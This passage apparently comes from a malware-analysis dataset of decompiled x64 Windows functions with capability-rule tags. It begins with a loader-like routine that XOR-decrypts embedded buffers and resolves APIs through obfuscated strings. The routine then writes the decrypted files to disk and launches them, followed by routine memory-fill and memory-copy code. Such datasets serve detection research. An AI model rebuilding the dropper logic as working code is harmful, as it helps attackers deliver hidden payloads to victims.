*(&stack0xffffffffffffffd8 + iVar2) = 0x14000160a;\n                    (*pcVar3)(iVar4);\n                    uVar8 = 0;\n                    if (uStack8920 != 0) {\n                        do {\n                            uVar7 = uVar8 + 1;\n                            *(uVar8 + iVar5) = *(uVar8 + iVar5) ^ (&stack0xffffffffffffdf38)[uVar8 & 3];\n                            uVar8 = uVar7;\n                        } while (uVar7 < uStack8920);\n                    }\n                    uVar8 = 0;\n                    if (uStack8916 != 0) {\n                        do {\n                            uVar7 = uVar8 + 1;\n                            *(uVar8 + iVar6) = *(uVar8 + iVar6) ^ (&stack0xffffffffffffdf38)[uVar8 & 3];\n                            uVar8 = uVar7;\n                        } while (uVar7 < uStack8916);\n                    }\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x140001669;\n                    arg4 = fcn.140001020(\"niD1LNvB.wHk\");\n                    *(&stack0x00000030 + iVar2) = arg4;\n                    if (arg4 == NULL) {\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x14000169a;\n                        fcn.1400012f0(&stack0x00000038 + iVar2, 0x104, 0x14001b950, puVar9);\n                    }\n                    else {\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x14000168c;\n                        fcn.1400012f0(&stack0x00000038 + iVar2, 0x104, 0x14001b948, arg4);\n                        puVar9 = arg4;\n                    }\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x1400016a6;\n                    iVar4 = fcn.140001020(\"bYa2F:\\\\8UML1zFj5VR\\\\\");\n                    if (iVar4 == 0) {\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x1400016db;\n                        fcn.1400012f0(&stack0xffffffffffffdb00, 0x104, 0x14001b950, puVar9);\n                    }\n                    else {\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x1400016cd;\n                        fcn.1400012f0(&stack0xffffffffffffdb00, 0x104, 0x14001b948, iVar4);\n                    }\n                    puVar9 = &stack0x00000038 + iVar2;\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x1400016fb;\n                    (*_sym.imp.USER32.dll_wsprintfW)(&stack0xffffffffffffe7c8, L\"%s%s\", &stack0xffffffffffffdb00);\n                    if (iVar4 != 0) {\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x14000170c;\n                        fcn.140004e48(iVar4);\n                    }\n                    if (*(&stack0x00000030 + iVar2) != 0) {\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x140001722;\n                        fcn.140004e48(*(&stack0x00000030 + iVar2));\n                    }\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x14000172e;\n                    iVar4 = fcn.140001020(\"iqYqzpFq1biLFj0tB7f\");\n                    *(&stack0x00000030 + iVar2) = iVar4;\n                    if (iVar4 == 0) {\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x14000175f;\n                        fcn.1400012f0(&stack0x00000038 + iVar2, 0x104, 0x14001b950, puVar9);\n                    }\n                    else {\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x140001751;\n                        fcn.1400012f0(&stack0x00000038 + iVar2, 0x104, 0x14001b948, iVar4);\n                    }\n                    puVar9 = &stack0x00000038 + iVar2;\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x14000177f;\n                    (*_sym.imp.USER32.dll_wsprintfW)(&stack0xfffffffffffff7c8, L\"%s %s\", &stack0xffffffffffffe7c8);\n                    if (*(&stack0x00000030 + iVar2) != 0) {\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x14000178e;\n                        fcn.140004e48(*(&stack0x00000030 + iVar2));\n                    }\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x14000179a;\n                    iVar4 = fcn.140001020(\"bYa2F:\\\\8UML1zFj5VR\\\\\");\n                    *(&stack0x00000030 + iVar2) = iVar4;\n                    if (iVar4 == 0) {\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x1400017cb;\n                        fcn.1400012f0(&stack0x00000038 + iVar2, 0x104, 0x14001b950, puVar9);\n                    }\n                    else {\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x1400017bd;\n                        fcn.1400012f0(&stack0x00000038 + iVar2, 0x104, 0x14001b948, iVar4);\n                    }\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x1400017eb;\n                    (*_sym.imp.USER32.dll_wsprintfW)\n                              (&stack0xffffffffffffdfc8, L\"%s%s\", &stack0x00000038 + iVar2, &stack0xffffffffffffdd30);\n                    if (*(&stack0x00000030 + iVar2) != 0) {\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x1400017fa;\n                        fcn.140004e48(*(&stack0x00000030 + iVar2));\n                    }\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x140001806;\n                    pcVar3 = fcn.140001130(\"nPgpDoispyzwbyj\");\n                    *(&stack0x00000010 + iVar2) = 0;\n                    *(&stack0x00000008 + iVar2) = 0x80;\n                    *(&stack0x00000000 + iVar2) = 2;\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x14000182f;\n                    iVar4 = (*pcVar3)(&stack0xffffffffffffdfc8, 0x40000000, 0, 0);\n                    if (iVar4 == -1) {\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x140001844;\n                        pcVar3 = fcn.140001130(\"VJLWc6v05rq-Y\");\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x140001849;\n                        (*pcVar3)(iVar5);\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x140001855;\n                        pcVar3 = fcn.140001130(\"VJLWc6v05rq-Y\");\n                        iVar5 = iVar6;\n                    }\n                    else {\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x140001869;\n                        pcVar3 = fcn.140001130(\"p051quU34yUa4\");\n                        puVar9 = &stack0xffffffffffffdf48;\n                        *(&stack0x00000000 + iVar2) = 0;\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x140001884;\n                        (*pcVar3)(iVar4, iVar6, uStack8916);\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x140001890;\n                        pcVar3 = fcn.140001130(\"_F-4IgsWPdb9ngg\");\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x140001895;\n                        (*pcVar3)(iVar4);\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x1400018a1;\n                        pcVar3 = fcn.140001130(\"VJLWc6v05rq-Y\");\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x1400018a6;\n                        (*pcVar3)(iVar6);\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x1400018b2;\n                        iVar4 = fcn.140001020(\"rRvhD1mc\");\n                        *(&stack0x00000030 + iVar2) = iVar4;\n                        if (iVar4 == 0) {\n                            *(&stack0xffffffffffffffd8 + iVar2) = 0x1400018e3;\n                            fcn.1400012f0(&stack0x00000038 + iVar2, 0x104, 0x14001b950, puVar9);\n                        }\n                        else {\n                            *(&stack0xffffffffffffffd8 + iVar2) = 0x1400018d5;\n                            fcn.1400012f0(&stack0x00000038 + iVar2, 0x104, 0x14001b948, iVar4);\n                        }\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x1400018ef;\n                        pcVar3 = fcn.140001130(\"uUCb6GQTsSBLBC4Lf\");\n                        *(&stack0x00000008 + iVar2) = 1;\n                        *(&stack0x00000000 + iVar2) = 0;\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x14000190f;\n                        (*pcVar3)(0, &stack0x00000038 + iVar2, &stack0xffffffffffffdfc8, 0);\n                        if (*(&stack0x00000030 + iVar2) != 0) {\n                            *(&stack0xffffffffffffffd8 + iVar2) = 0x14000191e;\n                            fcn.140004e48(*(&stack0x00000030 + iVar2));\n                        }\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x14000192a;\n                        pcVar3 = fcn.140001130(\"nPgpDoispyzwbyj\");\n                        *(&stack0x00000010 + iVar2) = 0;\n                        *(&stack0x00000008 + iVar2) = 0x80;\n                        *(&stack0x00000000 + iVar2) = 2;\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x140001953;\n                        iVar4 = (*pcVar3)(&stack0xffffffffffffe7c8, 0x40000000, 0, 0);\n                        if (iVar4 != -1) {\n                            *(&stack0xffffffffffffffd8 + iVar2) = 0x14000197c;\n                            pcVar3 = fcn.140001130(\"p051quU34yUa4\");\n                            *(&stack0x00000000 + iVar2) = 0;\n                            *(&stack0xffffffffffffffd8 + iVar2) = 0x140001997;\n                            (*pcVar3)(iVar4, iVar5, uStack8920, &stack0xffffffffffffdf48);\n                            *(&stack0xffffffffffffffd8 + iVar2) = 0x1400019a3;\n                            pcVar3 = fcn.140001130(\"_F-4IgsWPdb9ngg\");\n                            *(&stack0xffffffffffffffd8 + iVar2) = 0x1400019a8;\n                            (*pcVar3)(iVar4);\n                            *(&stack0xffffffffffffffd8 + iVar2) = 0x1400019b4;\n                            pcVar3 = fcn.140001130(\"VJLWc6v05rq-Y\");\n                            *(&stack0xffffffffffffffd8 + iVar2) = 0x1400019b9;\n                            (*pcVar3)(iVar5);\n                            *(&stack0xffffffffffffffd8 + iVar2) = 0x1400019c5;\n                            pcVar3 = fcn.140001130(\"7aUS5VqhGx3GzYqz-0\");\n                            *(&stack0x00000028 + iVar2) = &stack0xffffffffffffdd08;\n                            *(&stack0x00000020 + iVar2) = &stack0xffffffffffffdf58;\n                            *(&stack0x00000018 + iVar2) = 0;\n                            *(&stack0x00000010 + iVar2) = 0;\n                            *(&stack0x00000008 + iVar2) = 0;\n                            *(&stack0x00000000 + iVar2) = 0;\n                            *(&stack0xffffffffffffffd8 + iVar2) = 0x140001a02;\n                            (*pcVar3)(0, &stack0xfffffffffffff7c8, 0, 0);\n                            *(&stack0xffffffffffffffd8 + iVar2) = 0x140001a0e;\n                            pcVar3 = fcn.140001130(\"_F-4IgsWPdb9ngg\");\n                            *(&stack0xffffffffffffffd8 + iVar2) = 0x140001a17;\n                            (*pcVar3)(auStack8952._0_8_);\n                            *(&stack0xffffffffffffffd8 + iVar2) = 0x140001a23;\n                            pcVar3 = fcn.140001130(\"_F-4IgsWPdb9ngg\");\n                            *(&stack0xffffffffffffffd8 + iVar2) = 0x140001a2c;\n                            (*pcVar3)(auStack8952._8_8_);\n                            goto code_r0x00014000153e;\n                        }\n                        *(&stack0xffffffffffffffd8 + iVar2) = 0x140001968;\n                        pcVar3 = fcn.140001130(\"VJLWc6v05rq-Y\");\n                    }\n                }\n                *(&stack0xffffffffffffffd8 + iVar2) = 0x140001524;\n                (*pcVar3)(iVar5);\n            }\n        }\n    }\ncode_r0x00014000153e:\n    *(&stack0xffffffffffffffd8 + iVar2) = 0x14000154d;\n    fcn.140001a50(uStack56 ^ &stack0xffffffffffffffe0 + iVar2);\n    return;\n}\n",
        "token_count": 5320
    },
    "14000297": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nuchar (*) [16] fcn.140002970(uchar (*arg1) [16], ulong noname_1, uint64_t arg3)\n\n{\n    uchar (*pauVar1) [16];\n    uchar (*pauVar2) [16];\n    uint16_t uVar3;\n    uint64_t uVar5;\n    uchar auVar6 [12];\n    uint32_t uVar4;\n    uchar auVar7 [13];\n    uchar auVar8 [16];\n    uchar uVar9;\n    \n    uVar5 = noname_1 * 0x101010101010101;\n    uVar3 = uVar5;\n    uVar4 = uVar5;\n    if (arg3 < 0x11) {\n        uVar9 = uVar5;\n    // switch table (17 cases) at 0x14003c000\n        switch(*(arg3 * 4 + 0x14003c000) + 0x140000000) {\n        case 0x140002aa0:\n            *(arg1[-1] + arg3 + 1) = uVar5;\n        case 0x140002aa4:\n            *(arg1[-1] + arg3 + 9) = uVar4;\n        case 0x140002aa7:\n            *(arg1[-1] + arg3 + 0xd) = uVar3;\n        case 0x140002aab:\n            arg1[-1][arg3 + 0xf] = uVar9;\n            return arg1;\n        case 0x140002aae:\n            return arg1;\n        case 0x140002ab0:\n            *(arg1[-1] + arg3 + 4) = uVar5;\n        case 0x140002ab4:\n            *(arg1[-1] + arg3 + 0xc) = uVar4;\n            return arg1;\n        case 0x140002ab8:\n            *(arg1[-1] + arg3 + 7) = uVar5;\n            arg1[-1][arg3 + 0xf] = uVar9;\n            return arg1;\n        case 0x140002ac0:\n            *(arg1[-1] + arg3 + 3) = uVar5;\n        case 0x140002ac4:\n            *(arg1[-1] + arg3 + 0xb) = uVar4;\n            arg1[-1][arg3 + 0xf] = uVar9;\n            return arg1;\n        case 0x140002ad0:\n            *(arg1[-1] + arg3 + 2) = uVar5;\n        case 0x140002ad4:\n            *(arg1[-1] + arg3 + 10) = uVar4;\n        case 0x140002ad7:\n            *(arg1[-1] + arg3 + 0xe) = uVar3;\n            return arg1;\n        case 0x140002adc:\n            **arg1 = uVar5;\n            return arg1;\n        case 0x140002ae0:\n            **arg1 = uVar5;\n            *(*arg1 + 8) = uVar3;\n            (*arg1)[10] = uVar9;\n            return arg1;\n        case 0x140002af0:\n            **arg1 = uVar5;\n            *(*arg1 + 8) = uVar3;\n            return arg1;\n        case 0x140002af8:\n            **arg1 = uVar5;\n            *(*arg1 + 8) = uVar5;\n            return arg1;\n        }\n    }\n    uVar9 = SUB141(ZEXT814(uVar5) >> 0x30, 0);\n    auVar7 = ZEXT813(uVar5);\n    auVar6 = ZEXT812(uVar5);\n    auVar8 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(SUB1610(CONCAT97(SUB169(\n                                                            CONCAT88(SUB168(CONCAT79(SUB167(CONCAT610(SUB166(CONCAT511(\n                                                            SUB165(CONCAT412(SUB164(CONCAT313(SUB163(CONCAT214(SUB162(\n                                                            CONCAT115(SUB161(ZEXT816(uVar5) >> 0x38, 0), \n                                                                      CONCAT114(SUB151(ZEXT815(uVar5) >> 0x38, 0), \n                                                                                ZEXT814(uVar5))) >> 0x70, 0), \n                                                            CONCAT113(uVar9, auVar7)) >> 0x68, 0), \n                                                            CONCAT112(uVar9, auVar6)) >> 0x60, 0), \n                                                            CONCAT111(SUB131(auVar7 >> 0x28, 0), ZEXT811(uVar5))) >>\n                                                            0x58, 0), CONCAT110(SUB121(auVar6 >> 0x28, 0), uVar5)) >>\n                                                            0x50, 0), CONCAT19(SUB131(auVar7 >> 0x20, 0), uVar5)) >>\n                                                            0x48, 0), CONCAT18(SUB121(auVar6 >> 0x20, 0), uVar5)) >>\n                                                            0x40, 0), (uVar5 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (uVar5 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (uVar5 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (uVar5 >> 0x10) << 0x20) >> 0x20, 0), (uVar4 >> 8) << 0x18)\n                                                 >> 0x18, 0), (uVar5 >> 8) << 0x10) >> 0x10, 0), \n                       uVar3 & 0xff | uVar3 << 8);\n    pauVar1 = arg1;\n    if (0x80 < arg3) {\n        if ((*0x140038ac8 & 2) != 0) {\n            for (; arg3 != 0; arg3 = arg3 - 1) {\n                (*pauVar1)[0] = noname_1;\n                pauVar1 = *pauVar1 + 1;\n            }\n            return arg1;\n        }\n        *arg1 = auVar8;\n        pauVar1 = arg1[1] & 0xfffffffffffffff0;\n        arg3 = arg1 + (arg3 - pauVar1);\n        uVar5 = arg3 >> 7;\n        if (uVar5 != 0) {\n            if (*0x14001e028 < uVar5) {\n                do {\n                    *pauVar1 = auVar8;\n                    pauVar1[1] = auVar8;\n                    pauVar2 = pauVar1[8];\n                    pauVar1[2] = auVar8;\n                    pauVar1[3] = auVar8;\n                    uVar5 = uVar5 - 1;\n                    pauVar1[4] = auVar8;\n                    pauVar1[5] = auVar8;\n                    pauVar1[6] = auVar8;\n                    pauVar1[7] = auVar8;\n                    pauVar1 = pauVar2;\n                } while (uVar5 != 0);\n                arg3 = arg3 & 0x7f;\n            }\n            else {\n                do {\n                    *pauVar1 = auVar8;\n                    pauVar1[1] = auVar8;\n                    pauVar2 = pauVar1[8];\n                    pauVar1[2] = auVar8;\n                    pauVar1[3] = auVar8;\n                    uVar5 = uVar5 - 1;\n                    pauVar1[4] = auVar8;\n                    pauVar1[5] = auVar8;\n                    pauVar1[6] = auVar8;\n                    pauVar1[7] = auVar8;\n                    pauVar1 = pauVar2;\n                } while (uVar5 != 0);\n                arg3 = arg3 & 0x7f;\n            }\n        }\n    }\n    for (uVar5 = arg3 >> 4; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *pauVar1 = auVar8;\n        pauVar1 = pauVar1[1];\n    }\n    if ((arg3 & 0xf) != 0) {\n        *(pauVar1[-1] + (arg3 & 0xf)) = auVar8;\n    }\n    return arg1;\n}\n",
        "token_count": 1930
    },
    "14000318": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nulong * fcn.140003180(ulong *arg1, ulong *arg2, uint64_t arg3)\n\n{\n    uint *puVar1;\n    uchar uVar2;\n    ushort uVar3;\n    ulong *puVar4;\n    ulong *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint *puVar8;\n    int64_t iVar9;\n    uchar *puVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uint uVar20;\n    \n    if (arg3 < 0x11) {\n    // switch table (17 cases) at 0x14003c050\n        switch(*(arg3 * 4 + 0x14003c050) + 0x140000000) {\n        case 0x140003200:\n            return arg1;\n        case 0x140003201:\n            *arg1 = *arg2;\n            return arg1;\n        case 0x140003208:\n            *arg1 = *arg2;\n            return arg1;\n        case 0x14000320f:\n            uVar2 = *(arg2 + 2);\n            *arg1 = *arg2;\n            *(arg1 + 2) = uVar2;\n            return arg1;\n        case 0x14000321f:\n            *arg1 = *arg2;\n            return arg1;\n        case 0x140003225:\n            uVar17 = *(arg2 + 4);\n            uVar18 = *(arg2 + 1);\n            uVar19 = *(arg2 + 0xc);\n            *arg1 = *arg2;\n            *(arg1 + 4) = uVar17;\n            *(arg1 + 1) = uVar18;\n            *(arg1 + 0xc) = uVar19;\n            return arg1;\n        case 0x140003230:\n            uVar3 = *(arg2 + 1);\n            uVar2 = *(arg2 + 10);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar3;\n            *(arg1 + 10) = uVar2;\n            return arg1;\n        case 0x140003248:\n            *arg1 = *arg2;\n            return arg1;\n        case 0x140003250:\n            uVar2 = *(arg2 + 4);\n            *arg1 = *arg2;\n            *(arg1 + 4) = uVar2;\n            return arg1;\n        case 0x140003260:\n            uVar3 = *(arg2 + 4);\n            *arg1 = *arg2;\n            *(arg1 + 4) = uVar3;\n            return arg1;\n        case 0x140003270:\n            uVar3 = *(arg2 + 4);\n            uVar2 = *(arg2 + 6);\n            *arg1 = *arg2;\n            *(arg1 + 4) = uVar3;\n            *(arg1 + 6) = uVar2;\n            return arg1;\n        case 0x140003288:\n            uVar17 = *(arg2 + 1);\n            uVar2 = *(arg2 + 0xc);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar17;\n            *(arg1 + 0xc) = uVar2;\n            return arg1;\n        case 0x1400032a0:\n            uVar2 = *(arg2 + 1);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar2;\n            return arg1;\n        case 0x1400032b0:\n            uVar3 = *(arg2 + 1);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar3;\n            return arg1;\n        case 0x1400032c0:\n            uVar17 = *(arg2 + 1);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar17;\n            return arg1;\n        case 0x1400032d0:\n            uVar17 = *(arg2 + 1);\n            uVar3 = *(arg2 + 0xc);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar17;\n            *(arg1 + 0xc) = uVar3;\n            return arg1;\n        case 0x1400032f0:\n            uVar17 = *(arg2 + 1);\n            uVar3 = *(arg2 + 0xc);\n            uVar2 = *(arg2 + 0xe);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar17;\n            *(arg1 + 0xc) = uVar3;\n            *(arg1 + 0xe) = uVar2;\n            return arg1;\n        }\n    }\n    if (0x20 < arg3) {\n        iVar9 = arg2 - arg1;\n        if ((arg2 < arg1) && (arg1 < arg3 + arg2)) {\n            puVar8 = arg1 + iVar9 + (arg3 - 0x10);\n            uVar17 = puVar8[1];\n            uVar18 = puVar8[2];\n            uVar19 = puVar8[3];\n            puVar6 = arg1 + (arg3 - 0x10);\n            uVar11 = arg3 - 0x10;\n            puVar7 = puVar6;\n            uVar20 = *puVar8;\n            uVar13 = uVar17;\n            uVar14 = uVar18;\n            uVar15 = uVar19;\n            if ((puVar6 & 0xf) != 0) {\n                puVar7 = puVar6 & 0xfffffffffffffff0;\n                puVar1 = puVar7 + iVar9;\n                uVar20 = *puVar1;\n                uVar13 = puVar1[1];\n                uVar14 = puVar1[2];\n                uVar15 = puVar1[3];\n                *puVar6 = *puVar8;\n                *(arg1 + (arg3 - 0xc)) = uVar17;\n                *(arg1 + (arg3 - 8)) = uVar18;\n                *(arg1 + (arg3 - 4)) = uVar19;\n                uVar11 = puVar7 - arg1;\n            }\n            uVar12 = uVar11 >> 7;\n            if (uVar12 != 0) {\n                *puVar7 = uVar20;\n                puVar7[1] = uVar13;\n                puVar7[2] = uVar14;\n                puVar7[3] = uVar15;\n                puVar8 = puVar7;\n                while( true ) {\n                    puVar6 = puVar8 + iVar9 + -0x10;\n                    uVar17 = puVar6[1];\n                    uVar18 = puVar6[2];\n                    uVar19 = puVar6[3];\n                    puVar7 = puVar8 + iVar9 + -0x20;\n                    uVar20 = *puVar7;\n                    uVar13 = puVar7[1];\n                    uVar14 = puVar7[2];\n                    uVar15 = puVar7[3];\n                    puVar7 = puVar8 + -0x20;\n                    puVar8[-4] = *puVar6;\n                    puVar8[-3] = uVar17;\n                    puVar8[-2] = uVar18;\n                    puVar8[-1] = uVar19;\n                    puVar8[-8] = uVar20;\n                    puVar8[-7] = uVar13;\n                    puVar8[-6] = uVar14;\n                    puVar8[-5] = uVar15;\n                    puVar6 = puVar8 + iVar9 + -0x30;\n                    uVar17 = puVar6[1];\n                    uVar18 = puVar6[2];\n                    uVar19 = puVar6[3];\n                    puVar1 = puVar8 + iVar9 + -0x40;\n                    uVar20 = *puVar1;\n                    uVar13 = puVar1[1];\n                    uVar14 = puVar1[2];\n                    uVar15 = puVar1[3];\n                    uVar12 = uVar12 - 1;\n                    puVar8[-0xc] = *puVar6;\n                    puVar8[-0xb] = uVar17;\n                    puVar8[-10] = uVar18;\n                    puVar8[-9] = uVar19;\n                    puVar8[-0x10] = uVar20;\n                    puVar8[-0xf] = uVar13;\n                    puVar8[-0xe] = uVar14;\n                    puVar8[-0xd] = uVar15;\n                    puVar6 = puVar8 + iVar9 + -0x50;\n                    uVar17 = puVar6[1];\n                    uVar18 = puVar6[2];\n                    uVar19 = puVar6[3];\n                    puVar1 = puVar8 + iVar9 + -0x60;\n                    uVar20 = *puVar1;\n                    uVar13 = puVar1[1];\n                    uVar14 = puVar1[2];\n                    uVar15 = puVar1[3];\n                    puVar8[-0x14] = *puVar6;\n                    puVar8[-0x13] = uVar17;\n                    puVar8[-0x12] = uVar18;\n                    puVar8[-0x11] = uVar19;\n                    puVar8[-0x18] = uVar20;\n                    puVar8[-0x17] = uVar13;\n                    puVar8[-0x16] = uVar14;\n                    puVar8[-0x15] = uVar15;\n                    puVar1 = puVar8 + iVar9 + -0x70;\n                    uVar17 = puVar1[1];\n                    uVar18 = puVar1[2];\n                    uVar19 = puVar1[3];\n                    puVar6 = puVar7 + iVar9;\n                    uVar20 = *puVar6;\n                    uVar13 = puVar6[1];\n                    uVar14 = puVar6[2];\n                    uVar15 = puVar6[3];\n                    if (uVar12 == 0) break;\n                    puVar8[-0x1c] = *puVar1;\n                    puVar8[-0x1b] = uVar17;\n                    puVar8[-0x1a] = uVar18;\n                    puVar8[-0x19] = uVar19;\n                    *puVar7 = uVar20;\n                    puVar8[-0x1f] = uVar13;\n                    puVar8[-0x1e] = uVar14;\n                    puVar8[-0x1d] = uVar15;\n                    puVar8 = puVar7;\n                }\n                puVar8[-0x1c] = *puVar1;\n                puVar8[-0x1b] = uVar17;\n                puVar8[-0x1a] = uVar18;\n                puVar8[-0x19] = uVar19;\n                uVar11 = uVar11 & 0x7f;\n            }\n            for (uVar12 = uVar11 >> 4; uVar12 != 0; uVar12 = uVar12 - 1) {\n                *puVar7 = uVar20;\n                puVar7[1] = uVar13;\n                puVar7[2] = uVar14;\n                puVar7[3] = uVar15;\n                puVar7 = puVar7 + -4;\n                puVar8 = puVar7 + iVar9;\n                uVar20 = *puVar8;\n                uVar13 = puVar8[1];\n                uVar14 = puVar8[2];\n                uVar15 = puVar8[3];\n            }\n            if ((uVar11 & 0xf) != 0) {\n                uVar17 = *(arg2 + 4);\n                uVar18 = *(arg2 + 1);\n                uVar19 = *(arg2 + 0xc);\n                *arg1 = *arg2;\n                *(arg1 + 4) = uVar17;\n                *(arg1 + 1) = uVar18;\n                *(arg1 + 0xc) = uVar19;\n            }\n            *puVar7 = uVar20;\n            puVar7[1] = uVar13;\n            puVar7[2] = uVar14;\n            puVar7[3] = uVar15;\n            return arg1;\n        }\n        if (arg3 < 0x81) {\n            puVar8 = arg1 + iVar9;\n            uVar17 = *puVar8;\n            uVar18 = puVar8[1];\n            uVar19 = puVar8[2];\n            uVar20 = puVar8[3];\n            puVar5 = arg1 + 2;\n            puVar10 = arg3 - 0x10;\n        }\n        else {\n            if ((*0x140038ac8 & 2) != 0) {\n                puVar5 = arg1;\n                for (; arg3 != 0; arg3 = arg3 - 1) {\n                    *puVar5 = *arg2;\n                    arg2 = arg2 + 1;\n                    puVar5 = puVar5 + 1;\n                }\n                return arg1;\n            }\n            puVar8 = arg1 + iVar9;\n            uVar13 = puVar8[1];\n            uVar14 = puVar8[2];\n            uVar15 = puVar8[3];\n            puVar4 = arg1 + 2;\n            uVar17 = *puVar8;\n            uVar18 = uVar13;\n            uVar19 = uVar14;\n            uVar20 = uVar15;\n            if ((arg1 & 0xf) != 0) {\n                puVar7 = (puVar4 & 0xfffffffffffffff0) + iVar9;\n                uVar17 = *puVar7;\n                uVar18 = puVar7[1];\n                uVar19 = puVar7[2];\n                uVar20 = puVar7[3];\n                puVar4 = (puVar4 & 0xfffffffffffffff0) + 0x10;\n                *arg1 = *puVar8;\n                *(arg1 + 4) = uVar13;\n                *(arg1 + 1) = uVar14;\n                *(arg1 + 0xc) = uVar15;\n            }\n            puVar10 = arg1 + (arg3 - puVar4);\n            uVar11 = puVar10 >> 7;\n            puVar5 = puVar4;\n            if (uVar11 != 0) {\n                *(puVar4 + -2) = uVar17;\n                *(puVar4 + -0xc) = uVar18;\n                *(puVar4 + -1) = uVar19;\n                *(puVar4 + -4) = uVar20;\n                if (*0x14001e020 < uVar11) {\n                    while( true ) {\n                        puVar8 = puVar4 + iVar9;\n                        uVar17 = puVar8[1];\n                        uVar18 = puVar8[2];\n                        uVar19 = puVar8[3];\n                        puVar7 = puVar4 + iVar9 + 0x10;\n                        uVar20 = *puVar7;\n                        uVar13 = puVar7[1];\n                        uVar14 = puVar7[2];\n                        uVar15 = puVar7[3];\n                        puVar5 = puVar4 + 0x10;\n                        *puVar4 = *puVar8;\n                        *(puVar4 + 4) = uVar17;\n                        *(puVar4 + 1) = uVar18;\n                        *(puVar4 + 0xc) = uVar19;\n                        *(puVar4 + 2) = uVar20;\n                        *(puVar4 + 0x14) = uVar13;\n                        *(puVar4 + 3) = uVar14;\n                        *(puVar4 + 0x1c) = uVar15;\n                        puVar8 = puVar4 + iVar9 + 0x20;\n                        uVar17 = puVar8[1];\n                        uVar18 = puVar8[2];\n                        uVar19 = puVar8[3];\n                        puVar7 = puVar4 + iVar9 + 0x30;\n                        uVar20 = *puVar7;\n                        uVar13 = puVar7[1];\n                        uVar14 = puVar7[2];\n                        uVar15 = puVar7[3];\n                        uVar11 = uVar11 - 1;\n                        *(puVar4 + 4) = *puVar8;\n                        *(puVar4 + 0x24) = uVar17;\n                        *(puVar4 + 5) = uVar18;\n                        *(puVar4 + 0x2c) = uVar19;\n                        *(puVar4 + 6) = uVar20;\n                        *(puVar4 + 0x34) = uVar13;\n                        *(puVar4 + 7) = uVar14;\n                        *(puVar4 + 0x3c) = uVar15;\n                        puVar8 = puVar4 + iVar9 + 0x40;\n                        uVar17 = puVar8[1];\n                        uVar18 = puVar8[2];\n                        uVar19 = puVar8[3];\n                        puVar7 = puVar4 + iVar9 + 0x50;\n                        uVar20 = *puVar7;\n                        uVar13 = puVar7[1];\n                        uVar14 = puVar7[2];\n                        uVar15 = puVar7[3];\n                        *(puVar4 + 8) = *puVar8;\n                        *(puVar4 + 0x44) = uVar17;\n                        *(puVar4 + 9) = uVar18;\n                        *(puVar4 + 0x4c) = uVar19;\n                        *(puVar4 + 10) = uVar20;\n                        *(puVar4 + 0x54) = uVar13;\n                        *(puVar4 + 0xb) = uVar14;\n                        *(puVar4 + 0x5c) = uVar15;\n                        puVar8 = puVar4 + iVar9 + 0x60;\n                        uVar13 = *puVar8;\n                        uVar14 = puVar8[1];\n                        uVar15 = puVar8[2];\n                        uVar16 = puVar8[3];\n                        puVar8 = puVar4 + iVar9 + 0x70;\n                        uVar17 = *puVar8;\n                        uVar18 = puVar8[1];\n                        uVar19 = puVar8[2];\n                        uVar20 = puVar8[3];\n                        if (uVar11 == 0) break;\n                        *(puVar4 + 0xc) = uVar13;\n                        *(puVar4 + 100) = uVar14;\n                        *(puVar4 + 0xd) = uVar15;\n                        *(puVar4 + 0x6c) = uVar16;\n                        *(puVar4 + 0xe) = uVar17;\n                        *(puVar4 + 0x74) = uVar18;\n                        *(puVar4 + 0xf) = uVar19;\n                        *(puVar4 + 0x7c) = uVar20;\n                        puVar4 = 